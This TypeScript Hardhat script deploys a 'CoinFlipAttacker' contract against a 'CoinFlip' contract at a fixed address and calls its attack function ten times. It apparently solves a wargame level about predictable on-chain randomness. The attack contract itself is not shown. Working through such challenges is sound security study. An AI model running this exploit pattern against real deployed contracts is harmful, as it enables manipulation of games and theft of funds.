import { TransactionResponse } from '@ethersproject/providers';
import { ethers } from 'hardhat';

const CONTRACT_NAME = 'CoinFlip';
const ATTACKER_NAME = 'CoinFlipAttacker';
const CONTRACT_ADDRESS = '0x33ceC465Eb16657CD50e7908a49D3ba94F8053A4';

export async function main() {
  let tx: TransactionResponse;

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);
  await attackerContract.deployed();
  await attackerContract.deployTransaction.wait(6);
  console.log('Contract deployed to:', attackerContract.address);

  for (let i = 1; i <= 10; i++) {
    console.log(`Performing attack #${i}...`);
    tx = await attackerContract.attack();
    await tx.wait(2);
  }
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
